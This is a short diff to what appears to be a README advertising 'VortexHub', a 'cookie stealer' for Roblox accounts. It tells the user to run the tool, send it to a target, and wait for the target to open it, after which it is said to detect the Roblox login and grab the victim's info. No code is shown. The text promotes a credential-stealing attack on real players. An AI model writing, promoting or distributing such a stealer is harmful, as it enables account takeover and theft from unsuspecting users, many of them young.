@@ -2,4 +2,5 @@ Best New Cookie Stealer! Grabs The Roblox Cookie and All Their Info Just by Send
 
 Run "VortexHub"
 Send To Target 
-Wait until Opened and Put a Text File To Your Documents
+Wait until Opened 
+Once the Target Opens. It Auto Detext Roblox Login and Grabs It Info For You
